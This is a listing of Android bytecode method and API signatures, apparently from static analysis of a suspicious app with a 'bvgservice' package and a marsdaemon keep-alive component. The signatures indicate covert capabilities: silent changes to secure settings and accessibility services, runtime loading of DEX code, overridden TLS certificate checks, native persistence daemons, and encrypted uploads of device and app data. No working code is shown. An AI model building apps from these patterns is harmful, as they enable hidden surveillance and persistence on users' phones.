+Lcom/what/device/util/j;->a()Lcom/what/device/util/i; [access_flags=public final synchronized] @ 0xefcc
+Lcom/what/device/util/h;->f(Landroid/content/Context;)I [access_flags=public static] @ 0xed98
+Lcom/android/bvgservice/a/b/b;->a(Lorg/json/JSONObject;)V [access_flags=public final] @ 0x89fc
+Lorg/json/JSONObject;->put(Ljava/lang/String; I)Lorg/json/JSONObject;
+Lorg/json/JSONObject;->put(Ljava/lang/String; D)Lorg/json/JSONObject;
+Lcom/android/bvgservice/a/b/d;-><init>(Landroid/content/Context;)V [access_flags=public constructor] @ 0x922c
+Lcom/android/bvgservice/a/b/d;->a(Lorg/json/JSONObject;)V [access_flags=public final] @ 0x9284
+Lorg/json/JSONArray;-><init>()V
+Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
+Lcom/android/bvgservice/a/b/c;->g(Landroid/content/Context;)Ljava/util/List; [access_flags=private static] @ 0x9164
+Lcom/android/bvgservice/a/b/c;->f(Landroid/content/Context;)Ljava/util/List; [access_flags=private static] @ 0x9114
+Landroid/content/pm/PackageManager;->queryIntentActivities(Landroid/content/Intent; I)Ljava/util/List;
+Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;
+Landroid/content/Intent;-><init>(Ljava/lang/String; Landroid/net/Uri;)V
+Ljava/util/Collections;->sort(Ljava/util/List; Ljava/util/Comparator;)V
+Landroid/content/pm/ResolveInfo$DisplayNameComparator;-><init>(Landroid/content/pm/PackageManager;)V
+Ljava/util/List;->contains(Ljava/lang/Object;)Z
+Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;
+Ljava/util/List;->add(Ljava/lang/Object;)Z
+Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;
+Lcom/android/bvgservice/a/c/a;-><init>()V [access_flags=public constructor] @ 0x92b4
+Lcom/android/bvgservice/a/c/a;->a(Lorg/json/JSONObject;)V [access_flags=public final] @ 0x92e4
+Lorg/json/JSONObject;->getLong(Ljava/lang/String;)J
+Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;
+Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;
+Ljava/util/ArrayList;->clear()V
+Lorg/json/JSONArray;->length()I
+Lcom/android/bvgservice/a/c/b;->a(Lorg/json/JSONObject;)V [access_flags=public final] @ 0x9348
+Lorg/json/JSONObject;->put(Ljava/lang/String; J)Lorg/json/JSONObject;
+Lcom/android/bvgservice/a/d/a;->c(Ljava/lang/String; Ljava/lang/String; Ljava/lang/String; Ljava/lang/String;)[B [access_flags=private static] @ 0x9758
+Ljava/lang/String;->isEmpty()Z
+Ljava/net/URLEncoder;->encode(Ljava/lang/String;)Ljava/lang/String;
+Lcom/android/bvgservice/a/d/b;->a([B)Ljava/lang/String; [access_flags=public static] @ 0xa648
+Ljava/net/URLDecoder;->decode(Ljava/lang/String;)Ljava/lang/String;
+Lcom/android/bvgservice/a/d/b;->a(Ljava/lang/String;)[B [access_flags=public static] @ 0xa740
+Ljava/lang/String;-><init>([B)V
+Lcom/android/bvgservice/a/d/a;->a([B Ljava/lang/String; Ljava/lang/String; Ljava/lang/String;)[B [access_flags=private static] @ 0x95d8
+Lcom/android/bvgservice/a/d/a;-><clinit>()V [access_flags=static constructor] @ 0x94dc
+Ljava/util/Map;->put(Ljava/lang/Object; Ljava/lang/Object;)Ljava/lang/Object;
+Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
+Ljavax/crypto/spec/SecretKeySpec;-><init>([B I I Ljava/lang/String;)V
+Lcom/android/bvgservice/a/d/a;->a(Ljava/lang/String;)[B [access_flags=private static] @ 0x9584
+Ljavax/crypto/Cipher;->init(I Ljava/security/Key; Ljava/security/spec/AlgorithmParameterSpec;)V
+Ljavax/crypto/spec/IvParameterSpec;-><init>([B)V
+Ljavax/crypto/Cipher;->doFinal([B)[B
+Lcom/android/bvgservice/a/d/a;->b(Ljava/lang/String;)Ljava/lang/String; [access_flags=private static] @ 0x96a8
+Ljavax/crypto/Cipher;->init(I Ljava/security/Key;)V
+Ljava/util/Arrays;->copyOf([B I)[B
+Lcom/android/bvgservice/a/d/j;->a([B)Ljava/lang/String; [access_flags=public static] @ 0xbf08
+Ljava/security/MessageDigest;->getInstance(Ljava/lang/String;)Ljava/security/MessageDigest;
+Ljava/security/MessageDigest;->digest([B)[B
+Lcom/android/bvgservice/a/d/b$a;-><init>()V [access_flags=public constructor] @ 0x9834
+Lcom/android/bvgservice/a/d/b$b;-><init>([B)V [access_flags=public constructor] @ 0xa090
+Lcom/android/bvgservice/a/d/b$c;-><clinit>()V [access_flags=static constructor] @ 0xa0c0
+Ljava/lang/Class;->desiredAssertionStatus()Z
+Lcom/android/bvgservice/a/d/b$c;-><init>()V [access_flags=public constructor] @ 0xa19c
+Lcom/android/bvgservice/a/d/b$c;->a([B I)Z [access_flags=public final] @ 0xa1f4
+Ljava/lang/AssertionError;-><init>()V
+Ljava/lang/AssertionError;-><init>(Ljava/lang/Object;)V
+Ljava/lang/String;->getBytes()[B
+Lcom/android/bvgservice/a/d/b;-><clinit>()V [access_flags=static constructor] @ 0xa604
+Lcom/android/bvgservice/a/d/b;-><init>()V [access_flags=public constructor] @ 0xa630
+Ljava/io/OutputStream;->write([B I I)V
+Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String; Ljava/lang/String;)V
+Ljava/net/HttpURLConnection;->getResponseCode()I
+Ljava/net/HttpURLConnection;->setDoOutput(Z)V
+Ljava/lang/Exception;-><init>(Ljava/lang/String;)V
+Ljava/net/URL;-><init>(Ljava/lang/String;)V
+Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
+Ljava/io/OutputStream;->flush()V
+Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;
+Ljava/io/InputStream;->read([B)I
+Lcom/android/bvgservice/a/d/j;->a()Ljava/lang/String; [access_flags=public static] @ 0xbcb0
+Ljava/net/HttpURLConnection;->setDoInput(Z)V
+Ljava/lang/Thread;->sleep(J)V
+Lcom/android/bvgservice/a/d/g;->a(Ljava/lang/String; [Ljava/io/InputStream; Ljava/io/OutputStream;)Z [access_flags=public static] @ 0xb9d0
+Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
+Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
+Ljava/net/HttpURLConnection;->disconnect()V
+Ljava/net/HttpURLConnection;->setInstanceFollowRedirects(Z)V
+Lcom/android/bvgservice/a/d/f;->b(Ljava/io/File;)Z [access_flags=public static] @ 0xb478
+Ljava/io/RandomAccessFile;->seek(J)V
+Ljava/io/RandomAccessFile;->write([B I I)V
+Ljava/net/URL;->equals(Ljava/lang/Object;)Z
+Ljava/io/RandomAccessFile;-><init>(Ljava/io/File; Ljava/lang/String;)V
+Ljava/net/HttpURLConnection;->getURL()Ljava/net/URL;
+Ljava/net/HttpURLConnection;->connect()V
+Ljava/net/HttpURLConnection;->getContentLength()I
+Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;
+Ljava/lang/String;->length()I
+Ljava/util/zip/GZIPInputStream;-><init>(Ljava/io/InputStream;)V
+Ljava/net/HttpURLConnection;->getContentEncoding()Ljava/lang/String;
+Ljava/io/Closeable;->close()V
+Ljava/io/IOException;->getMessage()Ljava/lang/String;
+Ljava/security/MessageDigest;->digest()[B
+Ljava/io/InputStream;->read([B I I)I
+Ljava/security/MessageDigest;->update([B I I)V
+Ljava/io/InputStream;->available()I
+Ljava/io/FileOutputStream;->write([B)V
+Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
+Ljava/io/FileOutputStream;->flush()V
+Ljava/io/FileInputStream;->read([B I I)I
+Ljava/io/File;->isFile()Z
+Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
+Ljava/lang/String;->toLowerCase()Ljava/lang/String;
+Ljava/nio/MappedByteBuffer;->put(I B)Ljava/nio/ByteBuffer;
+Lcom/android/bvgservice/a/d/f;->b(Ljava/io/File; Ljava/io/File;)Z [access_flags=private static] @ 0xb4c4
+Ljava/nio/MappedByteBuffer;->clear()Ljava/nio/Buffer;
+Ljava/nio/MappedByteBuffer;->get(I)B
+Ljava/io/RandomAccessFile;->getChannel()Ljava/nio/channels/FileChannel;
+Ljava/io/RandomAccessFile;->length()J
+Ljava/nio/channels/FileChannel;->map(Ljava/nio/channels/FileChannel$MapMode; J J)Ljava/nio/MappedByteBuffer;
+Ljava/nio/MappedByteBuffer;->force()Ljava/nio/MappedByteBuffer;
+Ljava/util/Enumeration;->hasMoreElements()Z
+Ljava/util/zip/ZipFile;->getInputStream(Ljava/util/zip/ZipEntry;)Ljava/io/InputStream;
+Ljava/util/zip/ZipFile;-><init>(Ljava/io/File;)V
+Ljava/util/zip/ZipEntry;->getName()Ljava/lang/String;
+Ljava/util/Enumeration;->nextElement()Ljava/lang/Object;
+Ljava/util/zip/ZipFile;->entries()Ljava/util/Enumeration;
+Lcom/android/bvgservice/a/d/f;->f(Ljava/io/File;)Z [access_flags=private static] @ 0xb88c
+Ljava/util/zip/ZipEntry;->isDirectory()Z
+Ljava/lang/String;->replaceAll(Ljava/lang/String; Ljava/lang/String;)Ljava/lang/String;
+Ljava/io/File;->createNewFile()Z
+Ljava/util/Stack;->push(Ljava/lang/Object;)Ljava/lang/Object;
+Ljava/util/Stack;->pop()Ljava/lang/Object;
+Ljava/util/Stack;->size()I
+Ljava/util/Stack;-><init>()V
+Ljava/io/FileInputStream;->getChannel()Ljava/nio/channels/FileChannel;
+Ljava/nio/channels/FileChannel;->force(Z)V
+Ljava/io/FileOutputStream;->getChannel()Ljava/nio/channels/FileChannel;
+Ljava/nio/channels/FileChannel;->size()J
+Ljava/nio/channels/FileChannel;->transferTo(J J Ljava/nio/channels/WritableByteChannel;)J
+Lcom/android/bvgservice/a/d/g$1;-><init>()V [access_flags=constructor] @ 0xb918
+Lcom/android/bvgservice/a/d/g$a;-><init>()V [access_flags=public constructor] @ 0xb944
+Lcom/android/bvgservice/a/d/g$a;->checkServerTrusted([Ljava/security/cert/X509Certificate; Ljava/lang/String;)V [access_flags=public final] @ 0xb970
+Ljava/security/cert/X509Certificate;->checkValidity()V
+Ljavax/net/ssl/SSLContext;->init([Ljavax/net/ssl/KeyManager; [Ljavax/net/ssl/TrustManager; Ljava/security/SecureRandom;)V
+Ljavax/net/ssl/SSLContext;->getSocketFactory()Ljavax/net/ssl/SSLSocketFactory;
+Ljavax/net/ssl/HttpsURLConnection;->setReadTimeout(I)V
+Ljava/io/OutputStream;->close()V
+Ljavax/net/ssl/HttpsURLConnection;->disconnect()V
+Ljavax/net/ssl/SSLContext;->getInstance(Ljava/lang/String;)Ljavax/net/ssl/SSLContext;
+Ljava/io/InputStream;->close()V
+Ljavax/net/ssl/HttpsURLConnection;->setDefaultHostnameVerifier(Ljavax/net/ssl/HostnameVerifier;)V
+Ljavax/net/ssl/HttpsURLConnection;->setDefaultSSLSocketFactory(Ljavax/net/ssl/SSLSocketFactory;)V
+Ljavax/net/ssl/HttpsURLConnection;->setSSLSocketFactory(Ljavax/net/ssl/SSLSocketFactory;)V
+Ljavax/net/ssl/HttpsURLConnection;->setDoOutput(Z)V
+Ljavax/net/ssl/HttpsURLConnection;->setDoInput(Z)V
+Ljavax/net/ssl/HttpsURLConnection;->setRequestMethod(Ljava/lang/String;)V
+Ljavax/net/ssl/HttpsURLConnection;->setRequestProperty(Ljava/lang/String; Ljava/lang/String;)V
+Ljavax/net/ssl/HttpsURLConnection;->setConnectTimeout(I)V
+Ljavax/net/ssl/HttpsURLConnection;->getOutputStream()Ljava/io/OutputStream;
+Ljavax/net/ssl/HttpsURLConnection;->getInputStream()Ljava/io/InputStream;
+Landroid/os/Process;->myPid()I
+Landroid/os/Process;->killProcess(I)V
+Lcom/what/device/util/a;->a(Landroid/content/Context;)Lcom/what/device/util/a; [access_flags=public static synchronized] @ 0xe3c4
+Lcom/what/device/util/AdbManager$1;-><init>(Lcom/what/device/util/a;)V [access_flags=public constructor] @ 0xe020
+Lcom/android/bvgservice/a/d/j;->d()Z [access_flags=public static] @ 0xc23c
+Lcom/what/device/util/a;->a()Z [access_flags=public final] @ 0xe414
+Lcom/android/bvgservice/a/d/j;->j(Landroid/content/Context;)V [access_flags=private static] @ 0xc540
+Lcom/android/bvgservice/a/d/j;->i(Landroid/content/Context;)Z [access_flags=private static] @ 0xc4fc
+Lcom/android/bvgservice/a/d/j;->g(Landroid/content/Context;)Z [access_flags=public static] @ 0xc3d4
+Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+Lcom/android/bvgservice/a/d/j;->h(Landroid/content/Context;)Ljava/lang/String; [access_flags=private static] @ 0xc42c
+Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+Ljava/lang/String;->trim()Ljava/lang/String;
+Ljava/lang/StringBuffer;-><init>()V
+Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;
+Landroid/net/NetworkInfo;->getType()I
+Landroid/net/NetworkInfo;->isAvailable()Z
+Ljava/lang/Integer;->toHexString(I)Ljava/lang/String;
+Ljava/lang/String;->toUpperCase()Ljava/lang/String;
+Ljava/lang/System;->getProperty(Ljava/lang/String;)Ljava/lang/String;
+Lcom/android/bvgservice/a/d/j;-><clinit>()V [access_flags=static constructor] @ 0xbc90
+Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
+Ljava/io/FileReader;-><init>(Ljava/io/File;)V
+Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
+Landroid/os/SystemProperties;->get(Ljava/lang/String;)Ljava/lang/String;
+Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;
+Landroid/net/Proxy;->getDefaultHost()Ljava/lang/String;
+Lcom/android/bvgservice/a/d/j;->a(I)Ljava/lang/String; [access_flags=public static] @ 0xbdb4
+Lcom/android/bvgservice/b$1;-><init>(Lcom/android/bvgservice/b;)V [access_flags=constructor] @ 0xc618
+Landroid/content/pm/IPackageStatsObserver$Stub;-><init>()V
+Lcom/android/bvgservice/b$2;-><init>(Lcom/android/bvgservice/b;)V [access_flags=constructor] @ 0xc654
+Landroid/content/pm/IPackageDataObserver$Stub;-><init>()V
+Lcom/android/bvgservice/b$a;-><init>()V [access_flags=constructor] @ 0xc68c
+Ljava/text/DecimalFormat;->format(D)Ljava/lang/String;
+Ljava/text/DecimalFormat;-><init>(Ljava/lang/String;)V
+Ljava/io/FileInputStream;->close()V
+Ljava/io/FileInputStream;->available()I
+Landroid/app/ActivityManager;->getRunningAppProcesses()Ljava/util/List;
+Landroid/os/Debug$MemoryInfo;->getTotalPrivateDirty()I
+Ljava/lang/CharSequence;->toString()Ljava/lang/String;
+Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;
+Landroid/app/ActivityManager;->getProcessMemoryInfo([I)[Landroid/os/Debug$MemoryInfo;
+Landroid/content/Intent;->resolveActivityInfo(Landroid/content/pm/PackageManager; I)Landroid/content/pm/ActivityInfo;
+Landroid/content/pm/ApplicationInfo;->loadIcon(Landroid/content/pm/PackageManager;)Landroid/graphics/drawable/Drawable;
+Lcom/android/bvgservice/b;->c(Ljava/lang/String;)Z [access_flags=private] @ 0xc830
+Landroid/view/accessibility/AccessibilityManager;->getEnabledAccessibilityServiceList(I)Ljava/util/List;
+Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;
+Landroid/text/TextUtils$SimpleStringSplitter;->hasNext()Z
+Landroid/provider/Settings$Secure;->getInt(Landroid/content/ContentResolver; Ljava/lang/String;)I
+Landroid/text/TextUtils$SimpleStringSplitter;-><init>(C)V
+Landroid/text/TextUtils$SimpleStringSplitter;->setString(Ljava/lang/String;)V
+Landroid/accessibilityservice/AccessibilityServiceInfo;->getResolveInfo()Landroid/content/pm/ResolveInfo;
+Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver; Ljava/lang/String;)Ljava/lang/String;
+Landroid/text/TextUtils$SimpleStringSplitter;->next()Ljava/lang/String;
+Lcom/android/bvgservice/c;->b(Landroid/content/Context;)Ljava/lang/String; [access_flags=private static] @ 0xcf98
+Landroid/content/pm/ResolveInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;
+Landroid/content/ComponentName;->unflattenFromString(Ljava/lang/String;)Landroid/content/ComponentName;
+Ljava/util/Collections;->emptySet()Ljava/util/Set;
+Ljava/lang/StringBuilder;->length()I
+Landroid/os/Binder;->getCallingPid()I
+Landroid/provider/Settings$Secure;->putString(Landroid/content/ContentResolver; Ljava/lang/String; Ljava/lang/String;)Z
+Ljava/util/HashSet;-><init>()V
+Landroid/content/Context;->checkPermission(Ljava/lang/String; I I)I
+Ljava/util/Set;->add(Ljava/lang/Object;)Z
+Landroid/content/ComponentName;->flattenToString()Ljava/lang/String;
+Ljava/lang/StringBuilder;->deleteCharAt(I)Ljava/lang/StringBuilder;
+Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
+Ljava/util/Set;->iterator()Ljava/util/Iterator;
+Ljava/util/Set;->remove(Ljava/lang/Object;)Z
+Landroid/provider/Settings$Secure;->putInt(Landroid/content/ContentResolver; Ljava/lang/String; I)Z
+Ljava/lang/Class;->getName()Ljava/lang/String;
+Landroid/content/BroadcastReceiver;-><init>()V
+Lcom/android/bvgservice/d$1;->onReceive(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public final] @ 0xd014
+Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;
+Landroid/content/Intent;->getIntExtra(Ljava/lang/String; I)I
+Lcom/android/bvgservice/d;-><init>(Landroid/content/Context; Landroid/os/Handler;)V [access_flags=private constructor] @ 0xd110
+Lcom/android/bvgservice/e;->a(Ljava/lang/Object; Ljava/lang/String;)Ljava/lang/reflect/Field; [access_flags=private static] @ 0xd15c
+Lcom/android/bvgservice/e;->b(Ljava/lang/Object; Ljava/util/ArrayList; Ljava/io/File; Ljava/util/ArrayList;)[Ljava/lang/Object; [access_flags=private static] @ 0xd5b0
+Landroid/content/Context;->getClassLoader()Ljava/lang/ClassLoader;
+Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
+Lcom/android/bvgservice/e;->a(Ljava/lang/Object; Ljava/util/ArrayList; Ljava/io/File; Ljava/util/ArrayList;)[Ljava/lang/Object; [access_flags=private static] @ 0xd54c
+Lcom/android/bvgservice/f;->a(Landroid/content/Context; Ljava/lang/String;)V [access_flags=public static] @ 0xd6dc
+Lcom/android/bvgservice/e;->a(Ljava/lang/Object; Ljava/lang/String; [Ljava/lang/Object;)V [access_flags=private static] @ 0xd2c0
+Ljava/lang/reflect/Field;->isAccessible()Z
+Ljava/lang/NoSuchFieldException;-><init>(Ljava/lang/String;)V
+Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
+Ljava/lang/reflect/Field;->setAccessible(Z)V
+Ljava/lang/Class;->getSuperclass()Ljava/lang/Class;
+Lcom/android/bvgservice/e;->a(Ljava/lang/Object; Ljava/lang/String; [Ljava/lang/Class;)Ljava/lang/reflect/Method; [access_flags=private static varargs] @ 0xd200
+Ljava/lang/reflect/Method;->setAccessible(Z)V
+Ljava/lang/reflect/Method;->isAccessible()Z
+Ljava/lang/NoSuchMethodException;-><init>(Ljava/lang/String;)V
+Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;
+Ljava/lang/reflect/Array;->newInstance(Ljava/lang/Class; I)Ljava/lang/Object;
+Ljava/lang/Class;->getComponentType()Ljava/lang/Class;
+Ljava/lang/reflect/Field;->set(Ljava/lang/Object; Ljava/lang/Object;)V
+Lcom/android/bvgservice/f;->b(Ljava/lang/Object;)Ljava/lang/Object; [access_flags=private static] @ 0xd774
+Lcom/android/bvgservice/f;->a(Ljava/lang/Object; Ljava/lang/Object;)Ljava/lang/Object; [access_flags=private static] @ 0xd66c
+Lcom/android/bvgservice/f;->a(Ljava/lang/Object;)Ljava/lang/Object; [access_flags=private static] @ 0xd614
+Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String; Ljava/lang/String; Ljava/lang/String; Ljava/lang/ClassLoader;)V
+Lcom/android/bvgservice/f;->a(Ljava/lang/Object; Ljava/lang/Class; Ljava/lang/String;)Ljava/lang/Object; [access_flags=private static] @ 0xd640
+Ljava/lang/reflect/Array;->get(Ljava/lang/Object; I)Ljava/lang/Object;
+Ljava/lang/reflect/Array;->getLength(Ljava/lang/Object;)I
+Ljava/lang/reflect/Array;->set(Ljava/lang/Object; I Ljava/lang/Object;)V
+Lcom/android/bvgservice/g;-><clinit>()V [access_flags=static constructor] @ 0xd79c
+Lcom/android/bvgservice/g;-><init>()V [access_flags=private constructor] @ 0xd7bc
+Lcom/marswin89/marsdaemon/DaemonApplication;-><init>()V [access_flags=public constructor] @ 0xd7ec
+Lcom/marswin89/marsdaemon/DaemonApplication;->getDaemonConfigurations()Lcom/marswin89/marsdaemon/DaemonConfigurations; [access_flags=protected abstract] @ 0x0
+Lcom/marswin89/marsdaemon/DaemonApplication;->attachBaseContext(Landroid/content/Context;)V [access_flags=public final] @ 0xd820
+Lcom/marswin89/marsdaemon/DaemonApplication;->attachBaseContextByDaemon(Landroid/content/Context;)V [access_flags=public] @ 0xd858
+Lcom/marswin89/marsdaemon/a;->onAttachBaseContext(Landroid/content/Context;)V [access_flags=public abstract] @ 0x0
+Lcom/marswin89/marsdaemon/DaemonClient;->initDaemon(Landroid/content/Context;)V [access_flags=private] @ 0xd8f4
+Lcom/marswin89/marsdaemon/DaemonClient;->getProcessName()Ljava/lang/String; [access_flags=private] @ 0xd898
+Lcom/marswin89/marsdaemon/DaemonClient;->isDaemonPermitting(Landroid/content/Context;)Z [access_flags=private] @ 0xd9a8
+Lcom/marswin89/marsdaemon/b$a;->a()Lcom/marswin89/marsdaemon/b; [access_flags=static] @ 0xdf54
+Lcom/marswin89/marsdaemon/b;->a(Landroid/content/Context; Lcom/marswin89/marsdaemon/DaemonConfigurations;)V [access_flags=public abstract] @ 0x0
+Lcom/marswin89/marsdaemon/b;->b(Landroid/content/Context; Lcom/marswin89/marsdaemon/DaemonConfigurations;)V [access_flags=public abstract] @ 0x0
+Lcom/marswin89/marsdaemon/b;->a(Landroid/content/Context;)Z [access_flags=public abstract] @ 0x0
+Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String; Z)Z
+Lcom/marswin89/marsdaemon/DaemonClient;->setDaemonPermiiting(Landroid/content/Context; Z)Z [access_flags=protected] @ 0xd9f0
+Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String; Z)Landroid/content/SharedPreferences$Editor;
+Lcom/marswin89/marsdaemon/DaemonConfigurations$DaemonListener;->onPersistentStart(Landroid/content/Context;)V [access_flags=public abstract] @ 0x0
+Lcom/marswin89/marsdaemon/DaemonConfigurations$DaemonListener;->onWatchDaemonDaed()V [access_flags=public abstract] @ 0x0
+Lcom/marswin89/marsdaemon/DaemonConfigurations;-><init>(Lcom/marswin89/marsdaemon/DaemonConfigurations$DaemonConfiguration; Lcom/marswin89/marsdaemon/DaemonConfigurations$DaemonConfiguration;)V [access_flags=public constructor] @ 0xda50
+Lcom/marswin89/marsdaemon/NativeDaemonBase;-><init>(Landroid/content/Context;)V [access_flags=public constructor] @ 0xda9c
+Lcom/marswin89/marsdaemon/NativeDaemonBase;->onDaemonDead()V [access_flags=protected] @ 0xdab8
+Lcom/marswin89/marsdaemon/b;->a()V [access_flags=public abstract] @ 0x0
+Lcom/marswin89/marsdaemon/a/a$1;-><init>(Lcom/marswin89/marsdaemon/a/a; Landroid/content/Context; Lcom/marswin89/marsdaemon/DaemonConfigurations;)V [access_flags=constructor] @ 0xdad8
+Ljava/lang/Thread;-><init>()V
+Lcom/marswin89/marsdaemon/a/a$1;->run()V [access_flags=public final] @ 0xdafc
+Lcom/marswin89/marsdaemon/nativ/NativeDaemonAPI20;->doDaemon(Ljava/lang/String; Ljava/lang/String; Ljava/lang/String;)V [access_flags=public native] @ 0x0
+Lcom/marswin89/marsdaemon/nativ/NativeDaemonAPI20;-><init>(Landroid/content/Context;)V [access_flags=public constructor] @ 0xdfb8
+Lcom/marswin89/marsdaemon/a/a;-><init>()V [access_flags=public constructor] @ 0xdb64
+Lcom/marswin89/marsdaemon/a/a;->a(Ljava/io/File; Ljava/io/InputStream; Ljava/lang/String;)V [access_flags=private static] @ 0xdb8c
+Ljava/io/FileOutputStream;->close()V
+Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
+Ljava/io/File;->mkdirs()Z
+Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
+Ljava/io/FileOutputStream;->write([B I I)V
+Ljava/lang/Process;->waitFor()I
+Lcom/marswin89/marsdaemon/a/a;->a(Landroid/content/Context; Ljava/lang/String; Ljava/lang/String; Ljava/lang/String;)Z [access_flags=private static] @ 0xdc6c
+Lcom/marswin89/marsdaemon/a/a;->a()V [access_flags=public final] @ 0xdd98
+Landroid/os/SystemClock;->elapsedRealtime()J
+Landroid/app/AlarmManager;->setRepeating(I J J Landroid/app/PendingIntent;)V
+Lcom/marswin89/marsdaemon/a/a;->a(Landroid/content/Context; Lcom/marswin89/marsdaemon/DaemonConfigurations;)V [access_flags=public final] @ 0xddd4
+Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V
+Landroid/app/PendingIntent;->getService(Landroid/content/Context; I Landroid/content/Intent; I)Landroid/app/PendingIntent;
+Ljava/lang/Thread;->setPriority(I)V
+Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;
+Ljava/lang/Thread;->start()V
+Landroid/content/Intent;-><init>()V
+Landroid/content/ComponentName;-><init>(Ljava/lang/String; Ljava/lang/String;)V
+Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;
+Lcom/marswin89/marsdaemon/a/a;->a(Landroid/content/Context;)Z [access_flags=public final] @ 0xde90
+Lcom/marswin89/marsdaemon/a/a;->b(Landroid/content/Context; Lcom/marswin89/marsdaemon/DaemonConfigurations;)V [access_flags=public final] @ 0xdee8
+Lcom/marswin89/marsdaemon/nativ/NativeDaemonAPI20;-><clinit>()V [access_flags=static constructor] @ 0xdf80
+Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V
+Lcom/marswin89/marsdaemon/nativ/NativeDaemonAPI21;-><clinit>()V [access_flags=static constructor] @ 0xdfd0
+Lcom/marswin89/marsdaemon/nativ/NativeDaemonAPI21;-><init>(Landroid/content/Context;)V [access_flags=public constructor] @ 0xe008
+Lcom/what/device/util/AdbManager$1;->onReceive(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public final] @ 0xe03c
+Lcom/what/device/util/f;->a(Landroid/content/Intent; Ljava/lang/String;)Z [access_flags=public static] @ 0xe958
+Lcom/what/device/util/DaemonReceiver;-><init>()V [access_flags=public constructor] @ 0xe084
+Lcom/what/device/util/DaemonReceiver;->onReceive(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public] @ 0xe09c
+Lcom/what/device/util/job/a;->a(Landroid/content/Context;)V [access_flags=public final] @ 0xf8c0
+Lcom/what/device/util/job/a;->b()Landroid/content/Intent; [access_flags=public static] @ 0xf858
+Lcom/what/device/util/job/a;->a(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public final] @ 0xf8f4
+Lcom/what/device/util/job/a;->a()Lcom/what/device/util/job/a; [access_flags=public static] @ 0xf828
+Lcom/what/device/util/DaemonService$Inner;-><init>()V [access_flags=public constructor] @ 0xe0ec
+Lcom/what/device/util/DaemonService$Inner;->onHandleIntent(Landroid/content/Intent;)V [access_flags=protected] @ 0xe108
+Lcom/what/device/util/DaemonService$Inner;->startForeground(I Landroid/app/Notification;)V
+Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;
+Lcom/what/device/util/DaemonService;-><init>()V [access_flags=public constructor] @ 0xe138
+Lcom/what/device/util/DaemonService;->onCreate()V [access_flags=public] @ 0xe1ac
+Lcom/what/device/util/DaemonService;->startForeground(I Landroid/app/Notification;)V
+Lcom/what/device/util/DaemonService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+Lcom/what/device/util/DaemonService;->getApplicationContext()Landroid/content/Context;
+Lcom/what/device/util/c;->a(Landroid/content/Context;)V [access_flags=public static synchronized] @ 0xe594
+Lcom/what/device/util/DaemonService;->onDestroy()V [access_flags=public] @ 0xe21c
+Lcom/what/device/util/DaemonService;->onStartCommand(Landroid/content/Intent; I I)I [access_flags=public] @ 0xe234
+Ljava/lang/Thread;->getDefaultUncaughtExceptionHandler()Ljava/lang/Thread$UncaughtExceptionHandler;
+Lcom/what/device/util/a/a;->uncaughtException(Ljava/lang/Thread; Ljava/lang/Throwable;)V [access_flags=public final] @ 0xe2bc
+Ljava/lang/Thread$UncaughtExceptionHandler;->uncaughtException(Ljava/lang/Thread; Ljava/lang/Throwable;)V
+Ljava/lang/Throwable;->printStackTrace()V
+Landroid/content/Intent;->setClassName(Landroid/content/Context; Ljava/lang/String;)Landroid/content/Intent;
+Ljava/lang/Thread;->getId()J
+Landroid/content/Context;->stopService(Landroid/content/Intent;)Z
+Lcom/what/device/util/a;-><init>(Landroid/content/Context;)V [access_flags=private constructor] @ 0xe3a0
+Landroid/provider/Settings$Secure;->getInt(Landroid/content/ContentResolver; Ljava/lang/String; I)I
+Lcom/what/device/util/b;-><init>()V [access_flags=public constructor] @ 0xe448
